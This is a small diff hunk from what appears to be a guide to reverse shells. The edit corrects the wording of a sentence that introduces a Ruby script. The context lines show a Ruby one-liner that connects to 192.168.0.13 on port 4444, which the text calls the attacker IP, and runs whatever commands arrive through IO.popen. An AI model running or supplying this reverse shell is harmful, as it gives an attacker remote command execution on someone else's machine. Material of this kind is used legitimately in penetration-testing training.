@@ -27,7 +27,7 @@ ruby -rsocket -e 'c=TCPSocket.new("192.168.0.13","4444");while(cmd=c.gets);IO.po
 
 since `192.168.0.13` is the attacker IP
 
-If you what it as more flixable script file
+If you want it more flixable  script file
 
 ```ruby
 #!/usr/bin/env ruby
